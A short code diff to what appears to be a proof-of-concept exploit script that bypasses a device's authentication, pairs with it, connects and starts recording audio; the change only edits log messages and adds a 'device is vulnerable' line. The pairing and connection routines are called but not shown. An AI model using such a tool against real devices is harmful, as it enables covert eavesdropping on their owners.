@@ -65,10 +65,12 @@ def main():
     log_info(f"Avoiding authentication with {args.address}...")
     log_info(f"Generating shared key...")
     pair(target, verbose=args.verbose)
-
     log_warn(f"Key generated")
-    log_info(f"Establishing connection...")
+    log_info(f"The device is vulnerable!")
+
     time.sleep(1)
+
+    log_info(f"Establishing connection...")
     connect(target, verbose=args.verbose)
 
     log_info(f"Starting audio recording...")
